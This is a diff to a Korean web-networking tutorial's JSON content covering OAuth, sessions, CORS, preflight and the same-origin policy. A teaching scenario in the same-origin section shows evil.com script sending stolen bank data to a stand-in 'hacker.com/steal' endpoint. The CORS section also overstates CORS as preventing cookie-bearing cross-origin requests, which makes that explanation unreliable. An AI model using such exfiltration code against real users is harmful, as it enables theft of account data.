+        "content": "### Grant Types (인증 방식)\n\n```\n📱 Authorization Code (추천)\n├── 서버가 있는 앱용\n├── 가장 안전\n└── 카카오/구글 로그인\n\n📱 PKCE (모바일/SPA용)\n├── Authorization Code + 보안 강화\n├── 서버 없어도 안전\n└── 모바일 앱 권장\n\n🔑 Client Credentials\n├── 서버 to 서버\n├── 사용자 없음\n└── API 키 방식\n\n❌ Implicit (폐기 예정)\n└── 보안 취약, 사용 금지\n```\n\n### Scope (권한 범위)\n\n```\n카카오 예시:\n├── profile_nickname: 닉네임\n├── profile_image: 프로필 사진\n├── account_email: 이메일\n└── friends: 친구 목록\n\n필요한 것만 요청!\n├── 과도한 권한 요청 → 사용자 거부\n└── 최소 권한 원칙\n```\n\n### 토큰 관리\n\n```\nAccess Token:\n├── 짧은 수명 (1시간)\n├── API 호출용\n└── 노출 시 빠른 만료\n\nRefresh Token:\n├── 긴 수명 (수개월)\n├── Access Token 재발급\n├── 안전하게 서버 보관\n└── 탈취 시 피해 큼\n\n⚠️ 주의사항:\n├── Refresh Token은 서버에만!\n├── 클라이언트 저장 금지\n└── 탈취 시 즉시 폐기\n```\n\n### 보안 체크리스트\n\n```\n□ state 파라미터 사용 (CSRF 방지)\n□ HTTPS 필수\n□ 토큰 안전하게 저장\n□ 최소 권한 scope만 요청\n□ 에러 메시지 최소화\n□ redirect_uri 화이트리스트\n```"
+      }
+    ]
+  },
+  "05_인증/session": {
+    "id": "05_인증/session",
+    "title": "세션",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "세션의 개념과 서버 측 상태 관리를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🎫 세션이란?",
+        "content": "## 🎫 한 줄 요약\n> **서버의 손님 명부** - 누가 로그인했는지 서버가 기억해요!\n\n---\n\n## 💡 비유로 이해하기\n\n### 놀이공원 자유이용권:\n```\n🎢 놀이공원 (서버)\n├── 입장 시 팔찌 발급 (세션 ID)\n├── 놀이기구마다 팔찌 확인\n├── 명부에서 \"이 팔찌 = VIP\" 확인\n└── 퇴장 시 팔찌 회수 (세션 삭제)\n\n🌐 웹 서비스도 똑같아요!\n├── 로그인 시 세션 ID 발급\n├── 요청마다 세션 ID 확인\n├── 서버에서 \"이 ID = 홍길동\" 확인\n└── 로그아웃 시 세션 삭제\n```\n\n---\n\n## 🎯 세션 동작 방식\n\n### 1. 로그인 과정\n```\n클라이언트                    서버\n    │                         │\n    │ ── POST /login ───────► │\n    │    (id, password)       │\n    │                         │ 1. 비밀번호 확인 ✓\n    │                         │ 2. 세션 생성\n    │                         │    session_id: \"abc123\"\n    │                         │    data: {user_id: 1, name: \"홍길동\"}\n    │                         │ 3. 세션 저장소에 저장\n    │ ◄─ Set-Cookie ───────── │\n    │    session_id=abc123    │\n```\n\n### 2. 이후 요청\n```\n클라이언트                    서버\n    │                         │\n    │ ── GET /profile ──────► │\n    │    Cookie: session_id   │\n    │      =abc123            │\n    │                         │ 1. 세션 ID로 조회\n    │                         │ 2. {user_id: 1} 확인\n    │                         │ 3. 홍길동의 프로필 반환\n    │ ◄─ 프로필 데이터 ────── │\n```\n\n### 세션 저장소\n```\n📦 저장 위치 옵션:\n\n1. 메모리 (기본)\n   ├── 빠름\n   └── 서버 재시작 시 삭제\n\n2. 데이터베이스\n   ├── 영구 저장\n   └── 다소 느림\n\n3. Redis (추천)\n   ├── 빠름 + 영구 저장\n   ├── 여러 서버 공유 가능\n   └── 만료 시간 자동 관리\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 세션 구현하기",
+        "content": "### Express + express-session\n\n```javascript\nconst express = require('express');\nconst session = require('express-session');\n\nconst app = express();\n\n// 세션 설정\napp.use(session({\n  secret: 'my-secret-key',  // 서명용 비밀키\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    maxAge: 24 * 60 * 60 * 1000, // 1일\n    httpOnly: true,\n    secure: true  // HTTPS\n  }\n}));\n\n// 로그인\napp.post('/login', (req, res) => {\n  const { userId, password } = req.body;\n\n  // 비밀번호 확인 후...\n  req.session.userId = userId;\n  req.session.isLoggedIn = true;\n\n  res.json({ message: '로그인 성공!' });\n});\n\n// 인증 확인\napp.get('/profile', (req, res) => {\n  if (!req.session.isLoggedIn) {\n    return res.status(401).json({ error: '로그인 필요' });\n  }\n\n  res.json({ userId: req.session.userId });\n});\n\n// 로그아웃\napp.post('/logout', (req, res) => {\n  req.session.destroy();\n  res.json({ message: '로그아웃!' });\n});\n```\n\n### Python Flask-Session\n\n```python\nfrom flask import Flask, session\nfrom flask_session import Session\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'my-secret-key'\napp.config['SESSION_TYPE'] = 'filesystem'\nSession(app)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    # 로그인 검증 후...\n    session['user_id'] = user_id\n    session['logged_in'] = True\n    return {'message': '로그인 성공!'}\n\n@app.route('/profile')\ndef profile():\n    if not session.get('logged_in'):\n        return {'error': '로그인 필요'}, 401\n    return {'user_id': session['user_id']}\n\n@app.route('/logout', methods=['POST'])\ndef logout():\n    session.clear()\n    return {'message': '로그아웃!'}\n```\n\n### Redis 세션 저장소 (Node.js)\n\n```javascript\nconst RedisStore = require('connect-redis').default;\nconst { createClient } = require('redis');\n\nconst redisClient = createClient();\nawait redisClient.connect();\n\napp.use(session({\n  store: new RedisStore({ client: redisClient }),\n  secret: 'my-secret',\n  resave: false,\n  saveUninitialized: false\n}));\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 세션 관리 팁",
+        "content": "### 세션 보안\n\n```\n🔒 필수 설정:\n├── secret: 충분히 긴 랜덤 문자열\n├── cookie.httpOnly: true\n├── cookie.secure: true (HTTPS)\n└── cookie.sameSite: 'strict' 또는 'lax'\n\n⏰ 만료 관리:\n├── 적절한 maxAge 설정\n├── 활동 시 갱신 (sliding session)\n└── 중요 작업 시 재인증 요청\n```\n\n### 다중 서버 환경\n\n```\n문제:\n서버 A에서 로그인 → 세션 생성\n서버 B로 요청 → 세션 없음! 😱\n\n해결:\n┌─────────┐\n│ Redis   │ ← 세션 공유 저장소\n└────┬────┘\n     │\n   ┌─┴─┐\n   │   │\n서버A 서버B ← 같은 Redis 사용\n```\n\n### 세션 vs 토큰 선택\n\n```\n📊 세션 적합:\n├── 단일 서버\n├── 웹 브라우저 중심\n├── 즉시 무효화 필요\n└── 보안 중요\n\n📊 토큰(JWT) 적합:\n├── 다중 서버/마이크로서비스\n├── 모바일 앱\n├── API 중심\n└── Stateless 필요\n```"
+      }
+    ]
+  },
+  "06_CORS/cors-concept": {
+    "id": "06_CORS/cors-concept",
+    "title": "CORS 개념",
+    "category": "network",
+    "subCategory": "06_CORS",
+    "language": "Python",
+    "description": "Cross-Origin Resource Sharing의 개념을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🌐 CORS란?",
+        "content": "## 🌐 한 줄 요약\n> **다른 출처끼리 데이터 공유 허가증** - 브라우저의 보안 규칙이에요!\n\n---\n\n## 💡 왜 CORS가 필요한가?\n\n### 문제 상황:\n```\n악성 사이트: evil.com\n피해 사이트: bank.com\n\n1. 사용자가 bank.com 로그인 (쿠키 저장)\n2. 사용자가 evil.com 방문\n3. evil.com의 JavaScript:\n   fetch('https://bank.com/송금')\n\n⚠️ 브라우저의 쿠키가 자동 전송됨!\n└── 해커가 돈을 빼갈 수 있음!\n```\n\n### CORS로 해결:\n```\n브라우저: \"evil.com에서 bank.com 요청하네?\"\n브라우저: \"bank.com아, evil.com 허용해?\"\nbank.com: \"아니요, 허용 안 합니다\"\n브라우저: \"요청 차단!\" ❌\n\n→ 서버가 허용한 출처만 접근 가능!\n```\n\n---\n\n## 🎯 출처(Origin)란?\n\n### 출처의 구성:\n```\nhttps://www.example.com:443/path\n  │          │           │\n  │          │           └── 포트\n  │          └── 호스트(도메인)\n  └── 프로토콜(스킴)\n\n출처 = 프로토콜 + 호스트 + 포트\n```\n\n### 같은 출처 vs 다른 출처:\n```\n기준: https://example.com\n\n✅ 같은 출처 (Same-Origin)\nhttps://example.com/page      (경로만 다름)\nhttps://example.com/api/users (경로만 다름)\n\n❌ 다른 출처 (Cross-Origin)\nhttp://example.com            (프로토콜 다름)\nhttps://api.example.com       (호스트 다름)\nhttps://example.com:8080      (포트 다름)\nhttps://example.org           (도메인 다름)\n```\n\n### CORS가 적용되는 상황\n```\n1. XMLHttpRequest / fetch API\n2. 웹 폰트 (@font-face)\n3. WebGL 텍스처\n4. Canvas의 drawImage\n5. CSS Shapes의 이미지\n\n적용 안 됨:\n├── <img src=\"...\">\n├── <script src=\"...\">\n├── <link href=\"...\">\n└── 폼 제출 (form action)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 CORS 동작 방식",
+        "content": "### 단순 요청 (Simple Request)\n\n```\n조건:\n├── GET, HEAD, POST 중 하나\n├── 허용된 헤더만 사용\n│   └── Accept, Content-Type 등\n├── Content-Type이 다음 중 하나:\n│   ├── text/plain\n│   ├── multipart/form-data\n│   └── application/x-www-form-urlencoded\n└── ReadableStream 미사용\n\n단순 요청 흐름:\n브라우저                         서버\n    │                            │\n    │── GET /api/data ─────────► │\n    │   Origin: http://a.com     │\n    │                            │\n    │◄── 응답 ─────────────────── │\n    │   Access-Control-Allow-    │\n    │   Origin: http://a.com     │\n```\n\n### 프리플라이트 요청 (Preflight)\n\n```\n단순 요청 조건에 해당하지 않으면 → 프리플라이트\n\n브라우저                         서버\n    │                            │\n    │── OPTIONS /api/data ─────► │ (사전 확인)\n    │   Origin: http://a.com     │\n    │   Access-Control-Request-  │\n    │   Method: PUT              │\n    │   Access-Control-Request-  │\n    │   Headers: Content-Type    │\n    │                            │\n    │◄── 허용 여부 응답 ────────── │\n    │   Access-Control-Allow-    │\n    │   Origin: http://a.com     │\n    │   Access-Control-Allow-    │\n    │   Methods: GET, PUT, POST  │\n    │                            │\n    │── PUT /api/data ──────────► │ (실제 요청)\n    │   (데이터 포함)              │\n    │                            │\n    │◄── 응답 ─────────────────── │\n```\n\n### Express CORS 설정\n\n```javascript\nconst cors = require('cors');\n\n// 모든 출처 허용 (개발용)\napp.use(cors());\n\n// 특정 출처만 허용 (운영용)\napp.use(cors({\n  origin: 'https://myapp.com',\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  credentials: true  // 쿠키 허용\n}));\n\n// 여러 출처 허용\napp.use(cors({\n  origin: ['https://app1.com', 'https://app2.com'],\n}));\n\n// 동적 출처 검증\napp.use(cors({\n  origin: (origin, callback) => {\n    const allowedOrigins = ['https://app1.com', 'https://app2.com'];\n    if (!origin || allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('CORS 거부'));\n    }\n  }\n}));\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 CORS 에러 해결",
+        "content": "### 흔한 에러 메시지\n\n```\n\"Access to fetch at 'https://api.com'\nfrom origin 'https://myapp.com'\nhas been blocked by CORS policy\"\n\n원인:\n└── 서버가 CORS 헤더를 안 보냄\n\n해결:\n└── 서버에서 CORS 설정 추가\n```\n\n### 해결 방법\n\n```\n1. 서버에서 CORS 헤더 추가 (정석)\n   Access-Control-Allow-Origin: *\n   또는 특정 도메인\n\n2. 프록시 서버 사용\n   클라이언트 → 내 서버 → API 서버\n   (서버 간엔 CORS 없음)\n\n3. 개발 시 임시 해결\n   ├── 브라우저 CORS 플러그인\n   ├── --disable-web-security 옵션\n   └── webpack devServer.proxy\n```\n\n### 개발 환경 프록시\n\n```javascript\n// React (package.json)\n{\n  \"proxy\": \"http://localhost:5000\"\n}\n\n// Vite (vite.config.js)\nexport default {\n  server: {\n    proxy: {\n      '/api': 'http://localhost:5000'\n    }\n  }\n}\n\n// Next.js (next.config.js)\nmodule.exports = {\n  async rewrites() {\n    return [{\n      source: '/api/:path*',\n      destination: 'http://localhost:5000/:path*'\n    }];\n  }\n}\n```\n\n### 자주 하는 실수\n\n```\n❌ credentials: true + origin: '*'\n└── 불가능! 특정 origin 명시 필요\n\n❌ 프론트엔드에서 CORS 해결 시도\n└── CORS는 서버에서만 해결 가능\n\n❌ Access-Control-Allow-Origin 오타\n└── 정확한 헤더명 확인\n\n❌ OPTIONS 메서드 처리 안 함\n└── 프리플라이트 요청 실패\n```"
+      }
+    ]
+  },
+  "06_CORS/cors-preflight": {
+    "id": "06_CORS/cors-preflight",
+    "title": "Preflight 요청",
+    "category": "network",
+    "subCategory": "06_CORS",
+    "language": "Python",
+    "description": "CORS Preflight 요청의 동작을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "✈️ Preflight란?",
+        "content": "## ✈️ 한 줄 요약\n> **본 요청 전 사전 점검** - \"이거 해도 돼요?\" 미리 물어봐요!\n\n---\n\n## 💡 왜 Preflight가 필요한가?\n\n### 비유:\n```\n비행기 이륙 전:\n├── \"이 비행기 안전한가요?\"\n├── \"활주로 상태는요?\"\n└── 확인 후 이륙!\n\nCORS 요청 전:\n├── \"이 요청 허용하나요?\"\n├── \"이 헤더 써도 되나요?\"\n└── 확인 후 본 요청!\n```\n\n### Preflight가 필요한 이유:\n```\n1. 서버 보호\n   └── 위험한 요청 사전 차단\n\n2. 호환성\n   └── CORS 미지원 서버 보호\n\n3. 효율성\n   └── 불필요한 요청 방지\n```\n\n---\n\n## 🎯 Preflight 발생 조건\n\n### 다음 중 하나라도 해당되면 발생:\n\n```\n1. HTTP 메서드가 GET, HEAD, POST 외\n   ├── PUT\n   ├── DELETE\n   ├── PATCH\n   └── OPTIONS (요청하는 경우)\n\n2. 커스텀 헤더 사용\n   ├── Authorization\n   ├── X-Custom-Header\n   └── 등등\n\n3. Content-Type이 특수한 경우\n   ├── application/json ⭐ (자주 발생)\n   ├── application/xml\n   └── text/html\n\n4. ReadableStream 사용\n```\n\n### Preflight 흐름 상세:\n\n```\n┌────────────┐          ┌────────────┐\n│  브라우저   │          │   서버     │\n└─────┬──────┘          └─────┬──────┘\n      │                       │\n      │ OPTIONS /api/users    │\n      │ Origin: https://a.com │\n      │ Access-Control-       │\n      │   Request-Method: PUT │\n      │ Access-Control-       │\n      │   Request-Headers:    │\n      │   Content-Type,       │\n      │   Authorization       │\n      │──────────────────────►│\n      │                       │\n      │      204 No Content   │\n      │ Access-Control-       │\n      │   Allow-Origin: *     │\n      │ Access-Control-       │\n      │   Allow-Methods:      │\n      │   GET,POST,PUT,DELETE │\n      │ Access-Control-       │\n      │   Allow-Headers:      │\n      │   Content-Type,       │\n      │   Authorization       │\n      │ Access-Control-       │\n      │   Max-Age: 86400      │\n      │◄──────────────────────│\n      │                       │\n      │ PUT /api/users        │ (실제 요청)\n      │──────────────────────►│\n      │                       │\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 Preflight 처리하기",
+        "content": "### Express에서 수동 처리\n\n```javascript\n// OPTIONS 요청 직접 처리\napp.options('/api/*', (req, res) => {\n  res.header('Access-Control-Allow-Origin', 'https://myapp.com');\n  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');\n  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');\n  res.header('Access-Control-Max-Age', '86400'); // 24시간 캐시\n  res.sendStatus(204);\n});\n\n// 또는 cors 미들웨어 사용 (자동 처리)\nconst cors = require('cors');\napp.use(cors({\n  origin: 'https://myapp.com',\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  maxAge: 86400,\n  credentials: true\n}));\n```\n\n### Python Flask\n\n```python\nfrom flask import Flask\nfrom flask_cors import CORS\n\napp = Flask(__name__)\n\n# 기본 설정\nCORS(app)\n\n# 상세 설정\nCORS(app, resources={\n    r\"/api/*\": {\n        \"origins\": [\"https://myapp.com\"],\n        \"methods\": [\"GET\", \"POST\", \"PUT\", \"DELETE\"],\n        \"allow_headers\": [\"Content-Type\", \"Authorization\"],\n        \"max_age\": 86400\n    }\n})\n\n# 수동 처리\n@app.route('/api/users', methods=['OPTIONS', 'PUT'])\ndef users():\n    if request.method == 'OPTIONS':\n        response = make_response()\n        response.headers['Access-Control-Allow-Origin'] = '*'\n        response.headers['Access-Control-Allow-Methods'] = 'PUT'\n        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'\n        return response\n\n    # PUT 처리\n    return {'success': True}\n```\n\n### Preflight 캐싱\n\n```javascript\n// 클라이언트 요청 예시\nfetch('https://api.com/users', {\n  method: 'PUT',\n  headers: {\n    'Content-Type': 'application/json',\n    'Authorization': 'Bearer token'\n  },\n  body: JSON.stringify({ name: 'Kim' })\n});\n\n// 서버 응답에 Max-Age 설정\n// Access-Control-Max-Age: 86400\n\n// 효과:\n// 24시간 동안 같은 요청에 대해\n// Preflight 없이 바로 본 요청 가능\n\n// 브라우저별 최대값:\n// Chrome: 2시간 (7200초)\n// Firefox: 24시간\n// Safari: 5분\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 Preflight 최적화",
+        "content": "### Preflight 줄이는 방법\n\n```\n1. Max-Age 설정\n   └── 한 번 확인 후 캐싱\n\n2. 단순 요청으로 바꾸기\n   ├── GET/POST 사용\n   ├── Content-Type 변경\n   │   └── application/x-www-form-urlencoded\n   └── 커스텀 헤더 제거\n\n3. 프록시 사용\n   └── 같은 출처로 요청\n```\n\n### 디버깅 방법\n\n```\n1. 개발자 도구 → Network 탭\n2. OPTIONS 요청 찾기\n3. Headers 확인:\n   └── Request: Access-Control-Request-*\n   └── Response: Access-Control-Allow-*\n\n문제 확인:\n├── OPTIONS 응답 코드가 200/204 아닌가?\n├── Allow-Origin이 있는가?\n├── Allow-Methods에 해당 메서드가 있는가?\n└── Allow-Headers에 필요한 헤더가 있는가?\n```\n\n### 흔한 실수\n\n```\n❌ OPTIONS 메서드 미처리\napp.put('/api/users', ...)  // PUT만 처리\n// → OPTIONS 요청 404 에러\n\n✅ 해결\napp.options('/api/users', ...) // OPTIONS 추가\napp.put('/api/users', ...)\n\n또는 cors 미들웨어 사용\n\n❌ Allow-Headers 누락\n// Authorization 헤더 사용하는데\n// Allow-Headers에 없음\n\n✅ 해결\n'Access-Control-Allow-Headers': 'Authorization'\n```\n\n### 성능 고려\n\n```\nPreflight 비용:\n├── 추가 왕복 시간 (RTT)\n├── 서버 부하 증가\n└── 사용자 체감 지연\n\n최적화:\n├── Max-Age 최대로 설정\n├── CDN에서 OPTIONS 캐싱\n├── 가능하면 단순 요청 사용\n└── API 설계 시 고려\n```"
+      }
+    ]
+  },
+  "06_보안/cors-solution": {
+    "id": "06_보안/cors-solution",
+    "title": "CORS 해결 방법",
+    "category": "network",
+    "subCategory": "06_보안",
+    "language": "Python",
+    "description": "CORS 문제의 다양한 해결 방법을 익힙니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔧 CORS 해결하기",
+        "content": "## 🔧 한 줄 요약\n> **서버에서 헤더 추가 or 프록시 사용** - 상황에 맞는 해결책을 선택하세요!\n\n---\n\n## 🎯 해결 방법 총정리\n\n### 1. 서버에서 CORS 헤더 추가 (정석)\n```\n가장 올바른 방법!\n\n서버 응답에 추가:\nAccess-Control-Allow-Origin: https://myapp.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: Content-Type\n```\n\n### 2. 프록시 서버 사용\n```\n내 프론트엔드 → 내 백엔드 → 외부 API\n\n서버 ↔ 서버는 CORS 없음!\n```\n\n### 3. JSONP (구식)\n```\n<script> 태그는 CORS 제약 없음\nGET 요청만 가능\n보안 취약 → 사용 자제\n```\n\n### 상황별 선택:\n```\n┌────────────────────────┬────────────────┐\n│ 상황                    │ 해결 방법       │\n├────────────────────────┼────────────────┤\n│ 내가 서버 소유          │ CORS 헤더 추가  │\n│ 외부 API (CORS 없음)    │ 프록시 서버     │\n│ 개발 환경              │ 개발 프록시     │\n│ 테스트만               │ 브라우저 확장    │\n└────────────────────────┴────────────────┘\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 프레임워크별 해결",
+        "content": "### Express.js\n\n```javascript\n// npm install cors\nconst cors = require('cors');\n\n// 간단 설정\napp.use(cors());\n\n// 상세 설정\napp.use(cors({\n  origin: ['https://myapp.com', 'https://admin.myapp.com'],\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  exposedHeaders: ['X-Total-Count'],\n  credentials: true,\n  maxAge: 86400\n}));\n```\n\n### Spring Boot\n\n```java\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/api/**\")\n            .allowedOrigins(\"https://myapp.com\")\n            .allowedMethods(\"GET\", \"POST\", \"PUT\", \"DELETE\")\n            .allowedHeaders(\"*\")\n            .allowCredentials(true)\n            .maxAge(86400);\n    }\n}\n\n// 또는 컨트롤러에 직접\n@CrossOrigin(origins = \"https://myapp.com\")\n@RestController\npublic class UserController { ... }\n```\n\n### Django\n\n```python\n# pip install django-cors-headers\n\n# settings.py\nINSTALLED_APPS = [\n    'corsheaders',\n    ...\n]\n\nMIDDLEWARE = [\n    'corsheaders.middleware.CorsMiddleware',  # 맨 위에\n    ...\n]\n\n# 설정\nCORS_ALLOWED_ORIGINS = [\n    \"https://myapp.com\",\n]\nCORS_ALLOW_CREDENTIALS = True\nCORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE']\n```\n\n### Nginx\n\n```nginx\n# nginx.conf\nserver {\n    location /api/ {\n        # CORS 헤더 추가\n        add_header 'Access-Control-Allow-Origin' 'https://myapp.com';\n        add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE';\n        add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization';\n        add_header 'Access-Control-Allow-Credentials' 'true';\n\n        # Preflight 처리\n        if ($request_method = 'OPTIONS') {\n            add_header 'Access-Control-Max-Age' 86400;\n            add_header 'Content-Length' 0;\n            return 204;\n        }\n\n        proxy_pass http://backend;\n    }\n}\n```\n\n### 개발 환경 프록시\n\n```javascript\n// Vite\nexport default defineConfig({\n  server: {\n    proxy: {\n      '/api': {\n        target: 'https://external-api.com',\n        changeOrigin: true,\n        rewrite: (path) => path.replace(/^\\/api/, '')\n      }\n    }\n  }\n});\n\n// Create React App (setupProxy.js)\nconst { createProxyMiddleware } = require('http-proxy-middleware');\n\nmodule.exports = function(app) {\n  app.use('/api', createProxyMiddleware({\n    target: 'https://external-api.com',\n    changeOrigin: true\n  }));\n};\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 실전 해결 가이드",
+        "content": "### 에러 메시지별 해결\n\n```\n에러: No 'Access-Control-Allow-Origin'\n원인: 서버가 CORS 헤더 안 보냄\n해결: 서버에 CORS 설정 추가\n\n에러: Method not allowed\n원인: Allow-Methods에 해당 메서드 없음\n해결: 서버에서 메서드 허용\n\n에러: Request header not allowed\n원인: Allow-Headers에 헤더 없음\n해결: 서버에서 헤더 허용\n\n에러: Credentials not supported\n원인: origin: '*' + credentials: true\n해결: 특정 origin 명시\n```\n\n### 외부 API CORS 우회\n\n```javascript\n// 내 서버를 프록시로 사용\n\n// 클라이언트\nconst response = await fetch('/api/external');\n\n// 서버 (Express)\napp.get('/api/external', async (req, res) => {\n  const data = await fetch('https://external-api.com/data');\n  res.json(await data.json());\n});\n\n// 서버 간 통신은 CORS 제약 없음!\n```\n\n### 보안 주의사항\n\n```\n❌ 절대 하면 안 되는 것\n├── Access-Control-Allow-Origin: *\n│   + credentials: true\n├── 모든 origin 무조건 허용\n└── 운영 환경에서 * 사용\n\n✅ 올바른 방법\n├── 특정 origin만 화이트리스트\n├── 필요한 메서드/헤더만 허용\n├── credentials 신중하게 사용\n└── 로깅으로 CORS 요청 모니터링\n```\n\n### 디버깅 체크리스트\n\n```\n□ 서버에 CORS 미들웨어 있는가?\n□ origin이 정확한가? (http vs https)\n□ 포트 번호 포함했는가?\n□ 필요한 메서드 허용했는가?\n□ Content-Type 헤더 허용했는가?\n□ Authorization 헤더 허용했는가?\n□ OPTIONS 메서드 처리하는가?\n□ credentials 설정 일치하는가?\n```"
+      }
+    ]
+  },
+  "06_보안/same-origin-policy": {
+    "id": "06_보안/same-origin-policy",
+    "title": "동일 출처 정책",
+    "category": "network",
+    "subCategory": "06_보안",
+    "language": "Python",
+    "description": "Same-Origin Policy의 개념과 중요성을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🛡️ 동일 출처 정책이란?",
+        "content": "## 🛡️ 한 줄 요약\n> **다른 출처의 데이터는 못 읽어!** - 브라우저가 지켜주는 보안 규칙이에요!\n\n---\n\n## 💡 왜 필요한가?\n\n### 만약 이 정책이 없다면?\n```\n시나리오:\n\n1. 사용자가 bank.com 로그인\n2. 새 탭에서 evil.com 방문\n3. evil.com의 JavaScript:\n\n   // bank.com의 데이터를 마음대로 읽음!\n   fetch('https://bank.com/내계좌정보')\n     .then(res => res.json())\n     .then(data => {\n       // 해커 서버로 전송\n       fetch('https://hacker.com/steal', {\n         body: JSON.stringify(data)\n       });\n     });\n\n😱 계좌 정보 유출!\n```\n\n### 동일 출처 정책으로 보호:\n```\n브라우저: \"evil.com에서 bank.com 데이터 요청?\"\n브라우저: \"출처가 다르네!\"\n브라우저: \"읽기 차단!\" ❌\n\n→ JavaScript가 다른 출처 데이터를 읽을 수 없음!\n```\n\n---\n\n## 🎯 출처(Origin) 구성\n\n```\nhttps://www.example.com:443/path/page.html\n└──┬──┘ └───────┬───────┘└─┬┘\n   │            │          │\n프로토콜    호스트       포트\n\n출처 = 프로토콜 + 호스트 + 포트\n(경로는 포함 안 됨!)\n```\n\n### 출처 비교 예시:\n\n```\n기준: https://store.example.com/products\n\nhttps://store.example.com/cart     ✅ 같음 (경로만 다름)\nhttp://store.example.com/products  ❌ 다름 (프로토콜)\nhttps://api.example.com/products   ❌ 다름 (서브도메인)\nhttps://store.example.com:8080     ❌ 다름 (포트)\nhttps://store.example.org          ❌ 다름 (도메인)\n```\n\n### 제한되는 것들:\n```\n❌ 다른 출처로의 요청/응답 읽기\n❌ 다른 출처의 DOM 접근\n❌ 다른 출처의 Storage 접근\n❌ 다른 출처의 쿠키 접근\n\n⭕ 허용되는 것 (역사적 이유):\n├── <img src=\"다른출처\">\n├── <script src=\"다른출처\">\n├── <link href=\"다른출처\">\n├── <form action=\"다른출처\">\n└── 쓰기(전송)는 되지만 읽기는 불가\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 SOP 동작 확인",
+        "content": "### 차단되는 경우\n\n```javascript\n// a.com에서 실행\n\n// ❌ 다른 출처 API 호출 (CORS 없으면)\nfetch('https://b.com/api/data')\n  .then(res => res.json())  // 여기서 에러!\n  .catch(err => console.log('차단됨!'));\n\n// ❌ 다른 출처 iframe의 DOM\nconst iframe = document.querySelector('iframe');\n// iframe.src = 'https://b.com'\niframe.contentDocument;  // 에러!\n\n// ❌ 다른 출처 window의 정보\nconst popup = window.open('https://b.com');\npopup.document;  // 에러!\npopup.location.href;  // 에러!\n\n// ❌ 다른 출처 Storage\nlocalStorage.setItem('key', 'value');  // a.com 전용\n// b.com에서는 이 값에 접근 불가\n```\n\n### 허용되는 경우\n\n```javascript\n// 삽입(Embedding)은 허용\n// 단, 읽기는 불가\n\n// ✅ 이미지 로드 (표시만, 픽셀 읽기 불가)\nconst img = new Image();\nimg.src = 'https://b.com/image.png';\n\n// ✅ 스크립트 실행 (전역 스코프 공유)\nconst script = document.createElement('script');\nscript.src = 'https://b.com/script.js';\n// 실행은 되지만 응답 내용 읽기 불가\n\n// ✅ 폼 전송 (응답 읽기 불가)\nconst form = document.createElement('form');\nform.action = 'https://b.com/submit';\nform.method = 'POST';\nform.submit();  // 전송은 되지만 응답 못 읽음\n\n// ✅ 쓰기 요청 (응답 읽기 불가)\n// fetch로 POST는 되지만 응답 읽기 차단\nfetch('https://b.com/api', {\n  method: 'POST',\n  body: JSON.stringify(data)\n});\n// .then(res => res.json()) 여기서 차단\n```\n\n### 같은 출처 확인\n\n```javascript\n// 현재 출처 확인\nconsole.log(window.origin);\n// 또는\nconsole.log(window.location.origin);\n// 예: \"https://example.com\"\n\n// 출처 비교 함수\nfunction isSameOrigin(url) {\n  try {\n    const targetOrigin = new URL(url).origin;\n    return window.origin === targetOrigin;\n  } catch (e) {\n    return false;  // 잘못된 URL\n  }\n}\n\nisSameOrigin('https://example.com/page');  // true\nisSameOrigin('https://api.example.com');   // false\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 SOP 우회 방법 (합법적)",
+        "content": "### 1. CORS (표준 방법)\n\n```\n서버가 명시적으로 허용\n\nAccess-Control-Allow-Origin: https://a.com\n\n→ \"a.com은 우리 데이터 읽어도 돼요\"\n```\n\n### 2. document.domain (같은 상위 도메인)\n\n```javascript\n// a.example.com 과 b.example.com\n\n// 양쪽 페이지에서:\ndocument.domain = 'example.com';\n\n// 이제 서로 접근 가능!\n// ⚠️ 보안상 권장하지 않음\n// Chrome에서 지원 중단 예정\n```\n\n### 3. postMessage (안전한 통신)\n\n```javascript\n// 부모 페이지 (a.com)\nconst iframe = document.querySelector('iframe');\niframe.contentWindow.postMessage(\n  { type: 'greeting', data: 'hello' },\n  'https://b.com'  // 수신자 지정\n);\n\n// iframe 페이지 (b.com)\nwindow.addEventListener('message', (event) => {\n  if (event.origin !== 'https://a.com') return;\n  console.log(event.data);  // { type: 'greeting', data: 'hello' }\n});\n\n// ⭐ 가장 안전한 방법!\n```\n\n### 4. 프록시 서버\n\n```\n클라이언트 (a.com)\n    │\n    ↓ 같은 출처 